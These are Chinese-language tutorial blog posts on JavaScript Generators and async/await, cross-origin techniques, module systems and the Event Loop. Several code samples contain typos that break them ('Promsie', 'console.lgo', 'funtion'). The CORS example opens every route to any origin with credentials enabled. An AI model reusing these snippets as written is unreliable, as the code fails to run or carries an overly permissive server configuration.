执行Generator函数会返回一个遍历器对象，也就是说，Generator不仅是一个状态机，还是一个遍历器对象生成函数，返回的遍历器对象可以一次遍历Generator函数内部的每一个状态 Generator函数就是一个普通函数，但是有两个特征： function命令与函数名之间有个 * 号， 函数体内部使用yield语句定义状态 12345function * newGenerator()&#123; yield 'hello' yield 'world' return 'end'&#125; 这个函数内部有两个yield语句，所以该函数有三个状态，hello,world, return Generator函数调用和普通函数一样，都是在函数名后加上一对圆括号，不同的是，调用Generator函数之后，函数并不会立即执行，也不会返回运行结果，而是返回一个指向内部状态的指针对象，这个对象，就是Iterator对象。 下一步，必须调用遍历器对象的next方法，使指针移动到对象的next方法上，每次调用next方法，内部指针就会从函数头部或上一次停下来的地方继续执行，知道遇到下一条yield语句。换句话说，Generator函数是分段执行的，yield是暂停执行的标记，而next方法可以恢复执行 yield语句 遇到yield语句就暂停执行以后的操作，必将紧跟在yield后面的表达式作为值返回 下一次调用next时继续往下执行，直到遇到下一条yield语句 如果没有遇到新的yield语句，就一直运行到函数结束，直到return 如果函数没有return，则返回对象的value属性为undefine 用法用Generator改写上面回调嵌套的例子. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364//获取codelet getKeyPromise = function () &#123; return new Promsie(function (resolve, reject) &#123; wx.login(&#123; success(res) &#123; //第一层回调,调用wx.login接口 if (res.code) &#123; it.next(res.code) &#125; &#125; &#125;) &#125;);&#125;;//获取session_ketlet getTokenPromise = function (key) &#123; return new Promsie(function (resolve, reject) &#123; $.ajax(&#123; type: 'get', url: 'http://localhost:3000/getToken', data: &#123; code: key &#125;, success: function (res) &#123; it.next(res.code) &#125;, error: function (err) &#123; console.log(err) &#125; &#125;); &#125;);&#125;;//获取业务数据let getDataPromise = function (data) &#123; return new Promsie(function (resolve, reject) &#123; $.ajax(&#123; type: 'get', url: 'http://localhost:3000/getData', data: &#123; session_key: data, &#125;, success: function (res) &#123; it.next(res.session_key) &#125;, error: function (err) &#123; console.lgo(err) &#125; &#125;); &#125;);&#125;;function * main()&#123; let code = yield getKeyPromise() let session_key = yield getTokenPromise(code) let data = yield getDataPromise(session_key); console.log('业务数据' + data)&#125;//生成迭代器实例let it = main()//开始运行it.next()//这里是主线程，不会被影响console.log(666) 注意：如果我们一直占用JavaScript主线程的话，是没有时间去执行任务队列中的任务 12345// 运行第一步it.next();// 持续占用JavaScript主线程while(1) &#123;&#125;; // 这里是拿不到异步数据的，因为没有机会去任务队列里取任务执行 Async/Await上面我们介绍了Promise和Generator，把这两者结合起来，就是Async/Await。 Generator的缺点是还需要我们手动控制next()执行，使用Async/Await的时候，只要await后面跟着一个Promise，它会自动等到Promise决议以后的返回值，resolve(…)或者reject(…)都可以。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//获取codelet getKeyPromise = function () &#123; return new Promsie(function (resolve, reject) &#123; wx.login(&#123; success(res) &#123; //第一层回调,调用wx.login接口 if (res.code) &#123; resolve(res.code) &#125; &#125; &#125;) &#125;);&#125;;//获取session_ketlet getTokenPromise = function (key) &#123; return new Promsie(function (resolve, reject) &#123; $.ajax(&#123; type: 'get', url: 'http://localhost:3000/getToken', data: &#123; code: key &#125;, success: function (res) &#123; resolve(res.session_key); &#125;, error: function (err) &#123; reject(err); &#125; &#125;); &#125;);&#125;;//获取业务数据let getDataPromise = function (data) &#123; return new Promsie(function (resolve, reject) &#123; $.ajax(&#123; type: 'get', url: 'http://localhost:3000/getData', data: &#123; session_key: data, &#125;, success: function (res) &#123; resolve(res.userinfo); &#125;, error: function (err) &#123; reject(err); &#125; &#125;); &#125;);&#125;;async function main () &#123; let code = await getKeyPromise(); let session_key = await getTokenPromise(code); let busiData = await getDataPromise(session_key); console.log('业务数据：', busiData);&#125;main(); 可以看到，使用Async/Await，完全就是同步的书写方式，逻辑和数据依赖都非常清楚，只需要把异步的东西用Promise封装出去，然后使用await调用就可以了，也不需要像Generator一样需要手动控制next()执行。 Async/Await是Generator和Promise的组合，完全解决了基于回调的异步流程存在的两个问题，可能是现在最好的JavaScript处理异步的方式了。 参考JavaScript的异步编程","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"跨域","slug":"跨域","date":"2020-02-29T16:00:00.000Z","updated":"2024-05-25T04:21:29.274Z","comments":true,"path":"2020/03/01/跨域/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/01/%E8%B7%A8%E5%9F%9F/","excerpt":"同源限制策略 同源策略指的是：协议，域名，端口相同。同源策略是一种安全协议 对于普通的浏览器而言，上述三者只要有一个不同就会引发同源策略。从而限制他们之间的交互行为。具体限制如下： Cookie、LocalStorage和IndexDB无法读取； DOM无法获得； AJAX请求不能发送。","text":"同源限制策略 同源策略指的是：协议，域名，端口相同。同源策略是一种安全协议 对于普通的浏览器而言，上述三者只要有一个不同就会引发同源策略。从而限制他们之间的交互行为。具体限制如下： Cookie、LocalStorage和IndexDB无法读取； DOM无法获得； AJAX请求不能发送。 简单来说，只要协议，域名，端口有任何一个的不同，就被当作是跨域 为什么要有同源限制同源策略就是浏览器为了保证用户信息的安全，防止恶意的网站窃取数据，禁止不同域之间的JS进行交互，举两个例子： 比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。 1.用户访问www.mybank.com，登陆并进行网银操作，这时cookie啥的都生成并存放在浏览器；2.用户突然想起件事，并迷迷糊糊的访问了一个邪恶的网站www.xiee.com；3.如果这时浏览器不予限制，这时该网站就可以在它的页面中，没有限制地拿到银行的cookie；4.此时还不加以限制，并且银行也没有做响应的安全处理的话，黑客就可以发起对www.mybank.com的请求，那么用户的信息有可能就这么泄露了。5.而如果使用了同源策略，用户正常使用时访问的www.mybank.com的网页和服务端在同一服务器，或者说两者没有触发同源策略，那么就可以安全正常访问。而黑客的网站，则来自于其他域名，触发了同源策略，首先他就无法读取cookie，就算读取了也无法发送ajax请求 其实，同源限制主要是用来防止 CSRF 攻击的。简单点说，CSRF 攻击是利用用户的登录态发起恶意请求。也就是说，没有同源策略的情况下，A 网站可以被任意其他来源的 Ajax 访问到内容。如果你当前 A 网站还存在登录态，那么对方就可以通过 Ajax 获得你的任何信息。当然跨域并不能完全阻止 CSRF。 为什么要跨域跨域确实一定程度上保障了客户信息的安全，但是对于像客户端和服务端不在同一个域名和服务器下这种情况，两者之间要实现交互，就需要进行跨域 跨域的解决办法跨域资源共享（CORS）CORS（Cross-Origin Resource Sharing）跨域资源共享，定义了必须在访问跨域资源时，浏览器与服务器应该如何沟通。CORS背后的基本思想就是使用自定义的HTTP头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功还是失败。 服务器端对于CORS的支持，主要就是通过设置Access-Control-Allow-Origin来进行的。如果浏览器检测到相应的设置，就可以允许Ajax进行跨域的访问。 只需要在后台中加上响应头来允许域请求！在被请求的Response header中加入以下设置，就可以实现跨域访问了！ 123456//指定允许其他域名访问'Access-Control-Allow-Origin:*'//或指定域//响应类型'Access-Control-Allow-Methods:GET,POST'//响应头设置'Access-Control-Allow-Headers:x-requested-with,content-type' CORS预检请求虽然设置 CORS和前端没什么关系，但是通过这种方式解决跨域问题的话，就不得不认识一下预检请求，因为通过这种方式解决跨域问题的话，会在发送请求时出现两种情况，分别为简单请求和复杂请求。 什么是预检请求preflight请求，就是在发生cors请求时，浏览器检测到跨域请求，会自动发出一个OPTIONS请求来检测本次请求是否被服务器接受。一个OPTIONS请求一般会携带下面两个与CORS相关的头： Access-Control-Request-Method : 本次预检请求的请求方法。 Access-Control-Request-Headers：本次请求所携带的自定义首部字段。这些字段是导致产生OPTIONS请求的一个原因。 这样，服务端收到该预检请求后，会返回与CORS相关的响应头。主要会包括下面几个，但可能还会有其他的有关CORS字段： Access-Control-Allow-Origin: 服务器允许的跨域请求源 Access-Control-Allow-Methods: 服务器允许的请求方法 Access-Control-Allow-Headers : 服务器允许的自定义的请求首部字段 需要注意的是： 1、在上面的两次请求中，预检请求只是一个检查的过程，它不会携带任何请求的参数；预检通过后的请求才会真正的携带请求参数与服务器进行数据通信。 2、若服务器对预检请求没有任何响应，那么浏览器不知道服务器是否支持CORS而不会发送后续的实际请求；或者服务器不支持当前的Origin跨域访问也不会发送后续请求。 发生预检请求的条件上文提到过，发送请求时出现两种情况，分别为简单请求和复杂请求，而发生预检请求的条件：是否是简单请求。简单请求则直接发送具体的请求而不会产生预检请求。满足下面的所有条件就不会产生预检请求，也就是该请求是简单请求： 请求方法是GET、POST、HEAD其中任意一个 必须是下面定义对CORS安全的首部字段集合，不能是集合之外的其他首部字段。Accept、Accept-Language、Content-Language、Content-Type、DPR、Downlink、Save-Data、Viewport-Width、Width。 Content-Type的值必须是text/plain、multipart/form-data、application/x-www-form-urlencoded中任意一个值 预检请求的例子我使用的是nodejs作为后台后端代码： 1234567app.all('*', function(req, res, next) &#123; res.setHeader('Access-Control-Allow-Origin','*'); res.setHeader('Access-Control-Allow-Methods', 'PUT, GET, POST, DELETE, OPTIONS'); res.setHeader('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Access-Control-Allow-Credentials, X-PINGOTHER'); res.setHeader('Access-Control-Allow-Credentials', 'true'); next();&#125;); 前端代码： 123456789101112131415var xhr = new XMLHttpRequest();var url = 'http://127.0.0.1:9093/login/status'; function callCors()&#123; if(xhr) &#123; xhr.open('POST', url, true); xhr.setRequestHeader('X-PINGOTHER', 'pingpong'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(); &#125;&#125;window.onload = function()&#123; callCors()&#125; 然后就可以在360浏览器里面看到两次请求（Chrome里面看不到预检请求，不知道为什么）预检请求正式请求注意：要想在浏览器里面查看预检请求，必须勾选这个项目 jsonp跨域JSONP 的原理很简单，就是利用 script 标签没有跨域限制的漏洞，我们直接用XMLHttpRequest请求不同域上的数据时，是不可以的。但是，在页面上引入不同域上的js脚本文件却是可以的。 通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。所以jsonp是需要服务器端的页面进行相应的配合的。（即用JavaScript动态加载一个script文件，同时定义一个callback函数给script执行而已。） 123456&lt;script src=\"http://domain/api?param1=a&amp;param2=b&amp;callback=jsonp\"&gt;&lt;/script&gt;&lt;script&gt; function jsonp(data) &#123; console.log(data) &#125;&lt;/script&gt; jsonp跨域优缺点优点： 对于老的浏览器兼容性不错 不需要浏览器（上古浏览器）支持XMLHttpRequest 缺点： 只支持GET请求，不支持POST请求 它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。 document.domin配合iframe跨域两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置document.domain共享 Cookie或者处理iframe只需要给页面添加 document.domain = ‘test.com’ 表示主域名都相同就可以实现跨域 window.name + iframe跨域window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。 比如：有一个页面a.html,它里面有这样的代码： 1234window.name = \"我是a页面设置的\";setTimeout(function()&#123; window.location = \"http://127.0.0.1/JSONP/b.html\";&#125;,1000) b.html页面的代码： 1​console.log(window.name); a.html页面载入后1秒，跳转到了b.html页面，结果b页面打印出了： 我是a页面设置的 可以看到在b.html页面上成功获取到了它的上一个页面a.html给window.name设置的值。如果在之后所有载入的页面都没对window.name进行修改的话，那么所有这些页面获取到的window.name的值都是a.html页面设置的那个值。当然，如果有需要，其中的任何一个页面都可以对window.name的值进行修改。 注意，window.name的值只能是字符串的形式，这个字符串的大小最大能允许2M左右甚至更大的一个容量，具体取决于不同的浏览器，但一般是够用了。 那么在a.html页面中，我们具体怎么获取数据呢，因为我们想要即使a.html页面不跳转也能得到b.html里的数据，而不是只能页面跳转才获取。答案就是在a.html页面中使用一个隐藏的iframe来充当一个中间人角色，由iframe去跳转获取b.html的数据，然后a.html再去得到iframe获取到的数据。 postMessage跨域 这种方式通常用于获取嵌入页面中的第三方页面数据。一个页面发送消息，另一个页面判断来源并接收消息 1.）a.html：(http://www.domain1.com/a.html) 12345678910111213141516&lt;iframe id=\"iframe\" src=\"http://www.domain2.com/b.html\" style=\"display:none;\"&gt;&lt;/iframe&gt;&lt;script&gt; var iframe = document.getElementById('iframe'); iframe.onload = function() &#123; var data = &#123; name: 'aym' &#125;; // 向domain2传送跨域数据 iframe.contentWindow.postMessage(JSON.stringify(data), 'http://www.domain2.com'); &#125;; // 接受domain2返回数据 window.addEventListener('message', function(e) &#123; alert('data from domain2 ---&gt; ' + e.data); &#125;, false);&lt;/script&gt; 2.）b.html：(http://www.domain2.com/b.html) 1234567891011121314&lt;script&gt; // 接收domain1的数据 window.addEventListener('message', function(e) &#123; alert('data from domain1 ---&gt; ' + e.data); var data = JSON.parse(e.data); if (data) &#123; data.number = 16; // 处理后再发回domain1 window.parent.postMessage(JSON.stringify(data), 'http://www.domain1.com'); &#125; &#125;, false);&lt;/script&gt;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"js模块化","slug":"js模块化","date":"2020-02-28T16:00:00.000Z","updated":"2024-05-25T02:28:45.252Z","comments":true,"path":"2020/02/29/js模块化/","link":"","permalink":"https://wtaufpziv.github.io/2020/02/29/js%E6%A8%A1%E5%9D%97%E5%8C%96/","excerpt":"序言javascript一直没有模块（module）的体系， 无法将一个大程序拆分成为互相依赖的小文件，再用很简单的方法将他们拼接起来。，随着web2.0时代的到来，Ajax技术得到广泛应用，前端代码日益膨胀，此时在JS方面就会考虑使用模块化规范去管理。","text":"序言javascript一直没有模块（module）的体系， 无法将一个大程序拆分成为互相依赖的小文件，再用很简单的方法将他们拼接起来。，随着web2.0时代的到来，Ajax技术得到广泛应用，前端代码日益膨胀，此时在JS方面就会考虑使用模块化规范去管理。 什么是模块化什么是模块 将一个复杂的程序依据一定的规则(规范)封装成几个块(文件), 并进行组合在一起 块的内部数据与实现是私有的, 只是向外部暴露一些接口(方法)与外部其它模块通信 JavaScript模块化的进化历程全局函数作用：将不同的功能封装成为不同的函数 123456function a()&#123; ...&#125;function b()&#123; ...&#125; 缺点：污染全局命名空间，容易造成命名冲突和数据不安全的问题。 使用对象进行封装作用：减少了全局变量，解决命名冲突 12345678let module = &#123; name : 'tom', sayname:function()&#123; console.log(this.name) &#125;&#125;module.name = 'Jack'module,sayname() //Jack 缺点：内部模块暴露，成员可以被无限制访问与修改 匿名函数自调用（模仿块级作用域）作用： 数据是私有的，外部无法访问和修改 将属性和方法定义到函数内部，然后通过window添加属性向外暴露接口 1234567(function(window)&#123; let name = 'tom' function sayname()&#123; console.log(name) &#125; window.myModule = &#123;sayname&#125; //给window添加属性以暴露方法&#125;)(window) 缺点：如果当前这个模块依赖另一个模块怎么办? script引入依赖1234&lt;script type=\"text/javascript\" src=\"module.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; myModule.sayname()&lt;/script&gt; 模块化的好处 避免命名空间污染 功能分离，按需加载 更高的复用性 更高的可维护性 &lt; script &gt;标签的问题 当需要依赖多个模块，会发送多个http请求，导致请求过多 script标签的先后顺序需要严格按照模块之间的依赖关系来书写，对于使用者非常不友好 难以维护 现代的模块化规范现在开发中最流行的模块化规范有： commonJS AMD CMD ES6规范CommonJS概述Node应用由模块组成， 采用的就是CommonJS模块规范。每个文件就是一个模块，有自己的作用域，文件里面定义的变量，函数都是私有的。在服务端（node），模块的加载是运行时同步加载的。在客户端（浏览器），模块需要使用打包工具提前编译打包处理 支持的环境node天生支持CommonJS，浏览器端无法支持，需要使用第三方打包工具才能支持 特点 每个模块有自己的块级作用域，不会污染全局 模块可以多次加载，但是第一次加载之后结果就会缓存，之后的加载直接从缓存中读取 模块的加载顺序是其在代码中的出现顺序 基本语法 暴露模块：module.exports = value或exports.xxx = value 引入模块：require(xxx),如果是第三方模块，xxx为模块名；如果是自定义模块，xxx为模块文件路径 1234567//module1module.exports = &#123; name:'tom', sayname:function()&#123; console.log(this.name) &#125;&#125; 1234//module2module.exports.foo = funtion()&#123; console.log('this is module2')&#125; 1234//module3module.exports = function()&#123; console.log('this is module3')&#125; 12345678//applet a = require('./module1')let b = require('./module2')let c = require('./module3')a.sayname() //tomb.foo() // this is module2c() //this is module3 CommonJS暴露的模块到底是什么： CommonJS规定，每个模块内部，module变量代表当前模块（可以理解为一个指向当前对象的指针），这个变量有一个exports是对外的接口，它本身也是一个对象。外部文件加载时，实际上加载的是这个模块的exports对象。因此，模块内部相当于先将要暴露的部分当做属性添加给exports，或直接将对象赋值给exports，外部文件再从exports中取出属性使用。 而require命令，则读入并执行一个js文件，然后返回该模块的exports对象，如果没有发现，会报错 CommonJS加载机制输入的是被输出值的拷贝，也就是说对于js基本数据类型，一旦输出一个值，模块内再发生变化时，将不会对已经输出的值产生影响 123456789//libvar counter = 3;function incCounter() &#123; counter++;&#125;module.exports = &#123; counter: counter, incCounter: incCounter,&#125;; 123456var counter = require('./lib').counter;var incCounter = require('./lib').incCounter;console.log(counter); // 3incCounter();console.log(counter); // 3 counter是一个基本数据类型的值，会被缓存 AMD（RequireJS） 与CMD（SeaJS）支持的环境原生JS均不支持，需要使用requireJS和seaJS，一般用于浏览器端 CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数。由于Node.js主要用于服务器编程，模块文件一般都已经存在于本地硬盘，所以加载起来比较快，不用考虑非同步加载的方式，所以CommonJS规范比较适用。但是，如果是浏览器环境，要从服务器端加载模块，这时就必须采用非同步模式，因此浏览器端一般采用AMD规范。此外AMD规范比CommonJS规范在浏览器端实现要来着早。 CMD规范专门用于浏览器端，模块的加载是异步的，模块使用时才会加载执行。CMD规范整合了CommonJS和AMD规范的特点。在 Sea.js 中，所有 JavaScript 模块都遵循 CMD模块定义规范。 12345678910111213141516171819202122232425// AMD// 定义模块 myModule.jsdefine(['dependency'], function()&#123; var name = 'Byron'; function printName()&#123; console.log(name); &#125; return &#123; printName: printName &#125;;&#125;);// 加载模块require(['myModule'], function (my)&#123; my.printName();&#125;);// CMDdefine(function(require, exports, module) &#123; // 加载模块 // 可以把 require 写在函数体的任意地方实现延迟加载 var a = require('./a') a.doSomething()&#125;) ES6模块化ES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。CommonJS 和 AMD 模块，都只能在运行时确定这些东西。比如，CommonJS 模块就是对象，输入时必须查找对象属性。 支持的环境浏览器端和node均不支持，需要通过babel语法转换，或者依赖打包工具（如webpack）来使用。 目前谷歌浏览器可以通过设置chrome://flags/将Experimental JavaScript设置为enable，node端把文件名后缀修改为mjs即可。这些途径目前均在试验阶段。 语法export命令用于规定模块的对外接口，import命令用于输入其他模块提供的功能。 1234567891011/** 定义模块 math.js **/var basicNum = 0;var add = function (a, b) &#123; return a + b;&#125;;export &#123; basicNum, add &#125;;/** 引用模块 **/import &#123; basicNum, add &#125; from './math';function test(ele) &#123; ele.textContent = add(99 + basicNum);&#125; 如上例所示，使用import命令的时候，用户需要知道所要加载的变量名或函数名，否则无法加载。为了给用户提供方便，让他们不用阅读文档就能加载模块，就要用到export default命令，为模块指定默认输出。 1234567// export-default.jsexport default function () &#123; console.log('foo');&#125;// import-default.jsimport customName from './export-default';customName(); // 'foo' 模块默认输出, 其他模块加载该模块时，import命令可以为该匿名函数指定任意名字。 ES6模块化与CommonJS的差异 CommonJS输出的是一个值的拷贝， ES6输出的是值的引用 CommonJS模块是运行时候加载，ES6模块是编译时输出接口 12345678910// lib.jsexport let counter = 3;export function incCounter() &#123; counter++;&#125;// main.jsimport &#123; counter, incCounter &#125; from './lib';console.log(counter); // 3incCounter();console.log(counter); // 4 ES6 模块的运行机制与 CommonJS 不一样。ES6 模块是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块。 总结 CommonJS规范主要用于服务端编程，加载模块是同步的，这并不适合在浏览器环境，因为同步意味着阻塞加载，浏览器资源是异步加载的，因此有了AMD CMD解决方案。 AMD规范在浏览器环境中异步加载模块，而且可以并行加载多个模块。不过，AMD规范开发成本高，代码的阅读和书写比较困难，模块定义方式的语义不顺畅。 CMD规范与AMD规范很相似，都用于浏览器编程，依赖就近，延迟执行，可以很容易在Node.js中运行。不过，依赖SPM 打包，模块的加载逻辑偏重 ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"Event-Loop","slug":"Event-Loop","date":"2020-02-25T16:00:00.000Z","updated":"2024-05-25T04:21:30.275Z","comments":true,"path":"2020/02/26/Event-Loop/","link":"","permalink":"https://wtaufpziv.github.io/2020/02/26/Event-Loop/","excerpt":"序言进程与线程本质上讲，进程和线程都是对于CPU 工作时间片的一个描述进程就是对程序动态执行的描述， 线程是进程中的更小单位，描述了执行一段指令所需的时间 把这些概念拿到浏览器中来说，当你打开一个 Tab 页时，其实就是创建了一个进程，一个进程中可以有多个线程，比如渲染线程、JS 引擎线程、HTTP 请求线程等等。当你发起一个请求时，其实就是创建了一个线程，当请求结束后，该线程可能就会被销毁 JavaScript 是一门 单线程语言，即同一时间只能执行一个任务，即代码执行是同步并且阻塞的。这一点很好理解，例如浏览器内核的渲染引擎和JS引擎，在执行过程中渲染线程和JS线程就是互斥的 这其中的原因是因为 JS 可以修改 DOM，如果在 JS 执行的时候 UI 线程还在工作，就可能导致不能安全的渲染 UI。这其实也是一个单线程的好处，得益于 JS 是单线程运行的，可以达到节省内存，节约上下文切换时间，没有锁的问题的好处 但是，只能同步执行在实际应用中肯定是有问题的，所以 JS 有了一个用来实现异步的函数：setTimeout而Event Loop 就是为了确保 异步代码 可以在 同步代码 执行后继续执行的。","text":"序言进程与线程本质上讲，进程和线程都是对于CPU 工作时间片的一个描述进程就是对程序动态执行的描述， 线程是进程中的更小单位，描述了执行一段指令所需的时间 把这些概念拿到浏览器中来说，当你打开一个 Tab 页时，其实就是创建了一个进程，一个进程中可以有多个线程，比如渲染线程、JS 引擎线程、HTTP 请求线程等等。当你发起一个请求时，其实就是创建了一个线程，当请求结束后，该线程可能就会被销毁 JavaScript 是一门 单线程语言，即同一时间只能执行一个任务，即代码执行是同步并且阻塞的。这一点很好理解，例如浏览器内核的渲染引擎和JS引擎，在执行过程中渲染线程和JS线程就是互斥的 这其中的原因是因为 JS 可以修改 DOM，如果在 JS 执行的时候 UI 线程还在工作，就可能导致不能安全的渲染 UI。这其实也是一个单线程的好处，得益于 JS 是单线程运行的，可以达到节省内存，节约上下文切换时间，没有锁的问题的好处 但是，只能同步执行在实际应用中肯定是有问题的，所以 JS 有了一个用来实现异步的函数：setTimeout而Event Loop 就是为了确保 异步代码 可以在 同步代码 执行后继续执行的。 调用栈（Call Stack）顾名思义，调用栈本身就是一个栈，只不过栈里面装的是一个个待执行的函数 Event Loop 会一直检查 Call Stack 中是否有函数需要执行，如果有，就从栈顶依次执行。同时，如果执行的过程中发现其他函数，继续入栈然后执行。 举个例子，函数A调用函数B 栈空 执行函数A，函数A入栈 函数A执行函数B，函数B入栈 函数B执行完毕，出栈 函数A执行完毕，出栈 栈空 对于下面这个代码： 1234567const bar = () =&gt; console.log('bar')const baz = () =&gt; console.log('baz')const foo = () =&gt; &#123; console.log('foo') bar() baz()&#125; 这段代码在 调用栈中的运行顺序如下图：当我们使用递归的时候，因为栈可存放的函数是有限制的，一旦存放了过多的函数且没有得到释放的话，就会出现爆栈的问题 1234function bar() &#123; bar()&#125;bar() 对于同步执行的代码，其在运行时候的机制可以用调用栈来解释，而对于异步执行的代码，例如一次网络请求，setTimeout函数，或者其他一些由于耗时长而需要异步执行的代码，这时就要引出 事件表格（Event Table） 和 事件队列 (Event Queue) 了 Event TableEvent Table 可以理解成一张 事件-&gt;回调函数 对应表它就是用来存储 JavaScript 中的异步事件 (request, setTimeout, IO等) 及其对应的回调函数的列表 Event QueueEvent Queue 简单理解就是 回调函数 队列，所以它也叫 Callback Queue当 Event Table 中的事件被触发，事件对应的 回调函数 就会被 push 进这个 Event Queue，然后等待被执行 Event Loop（浏览器）了解了这些，就开始进入主题。首先来看一张图这个图要表达的内容用文字来表述的话： 同步和异步任务分别进入不同的执行”场所”，同步的进入主线程，异步的进入Event Table并注册函数。 当指定的事情完成时，Event Table会将这个函数移入Event Queue。 主线程内的任务执行完毕为空，会去Event Queue读取对应的函数，进入主线程执行。 上述过程会不断重复，也就是常说的Event Loop(事件循环)。 我们不禁要问了，那怎么知道主线程执行栈为空啊？js引擎存在monitoring process进程，会持续不断的检查主线程执行栈是否为空，一旦为空，就会去Event Queue那里检查是否有等待被调用的函数。 如果上面的调用栈是一个银行窗口，任务队列中的回调函数是一个个排队办业务的人，那么 Event Loop 就是叫号系统！Event Loop 的唯一任务就是 连接任务队列和调用栈： 它不停检查 调用栈 中是否有任务需要执行，如果没有，就检查 任务队列，从中弹出一个任务，放入调用栈中，如此往复循环。 理解了这个之后，来看一个很常见的网络请求的栗子： 123456789let data = [];$.ajax(&#123; url:www.javascript.com, data:data, success:() =&gt; &#123; console.log('发送成功!'); &#125;&#125;)console.log('代码执行结束'); 稍微有点开发经验的读者应该都知道，这段代码会先输出“代码执行结束”，再输出“发送成功”。因为对于上述代码，有如下执行流程： ajax进入Event Table，注册回调函数success。 执行console.log(‘代码执行结束’)。 ajax事件完成，回调函数success进入Event Queue。 主线程从Event Queue读取回调函数success并执行。 再来看一个setTimeout的栗子： 1234567const foo = () =&gt; console.log(\"First\");const bar = () =&gt; setTimeout(() =&gt; console.log(\"Second\"), 500);const baz = () =&gt; console.log(\"Third\");bar();foo();baz(); 我们调用了函数 bar。bar 返回了一个 setTimeout 函数。 setTimeout 中的回调函数被添加到 Web API，setTimeout 函数和 bar 调用完成被从调用栈弹出。 定时器开始，同时函数 foo 被调用，打印出 First 函数 baz 被调用，打印出 Third。 500ms 定时器结束，回调函数被放入任务队列，Event Loop 检查到调用栈是空的，所以将其取出放在调用栈。 回调函数被执行，打印出 Second。重新认识setTimeout根据上面的例子和前文的叙述我们知道，由于javascript是并将永远是单线程任务，因此为了实现非阻塞，JS提供了诸如setTimeout一类的实现异步非阻塞的WebApi函数。因此对于setTimeout给人的第一映像是延迟执行代码，但实际上它最大的作用是实现异步非阻塞 123setTimeout(() =&gt; &#123; console.log('延时3秒');&#125;,3000) 渐渐的setTimeout用的地方多了，终于问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这又咋回事啊 12345setTimeout(() =&gt; &#123; console.log('666')&#125;,3000)sleep(10000000) 在浏览器执行这段代码，发现要远远超过三秒之后才会打印出666 task()进入Event Table并注册,计时开始。 执行sleep函数，很慢，非常慢，计时仍在继续。 3秒到了，计时事件timeout完成，task()进入Event Queue，但是sleep也太慢了吧，还没执行完，只好等着。 sleep终于执行完了，task()终于从Event Queue进入了主线程执行。 这个时候就要结合上文所讲的栗子，重新认识setTimeout：经过指定时间后，把要执行的任务(本例中为console.log)加入到EventQueue中，不是经过指定的时间立即执行，上述代码中，如果在同步代码部分执行了一些比较复杂的操作和运算，也会导致真正的延迟时间大于3秒 那么如果说setTimeout函数设置延迟时间为0，且执行栈为空呢?答案是：即便主线程为空，0毫秒实际上也是达不到的。根据HTML的标准，最低是4毫秒 setInterval上面说完了setTimeout，当然不能错过它的孪生兄弟setInterval。他俩差不多，只不过后者是循环的执行。对于执行顺序来说，setInterval会每隔指定的时间将注册的函数置入Event Queue，如果前面的任务耗时太久，那么同样需要等待。唯一需要注意的一点是，对于setInterval(fn,ms)来说，我们已经知道不是每过ms秒会执行一次fn，而是每过ms秒，会有fn进入Event Queue。一旦setInterval的回调函数fn执行时间超过了延迟时间ms，那么就完全看不出来有时间间隔了， 仿佛setInterval函数失效了一样。这句话你品！你细品！！！基本上就是Event Queue入队速度与出队速度之间的关系，以我的理解，当入队速度远小于出队速度，那么就会有时间间隔的感觉，否则就没有。 宏队列和微队列宏队列，macrotask，也叫tasks。 一些异步任务的回调会依次进入macro task queue，等待后续被调用，这些异步任务包括： setTimeout setInterval setImmediate (Node独有) requestAnimationFrame (浏览器独有) I/O UI rendering (浏览器独有) 微队列，microtask，也叫jobs。 另一些异步任务的回调会依次进入micro task 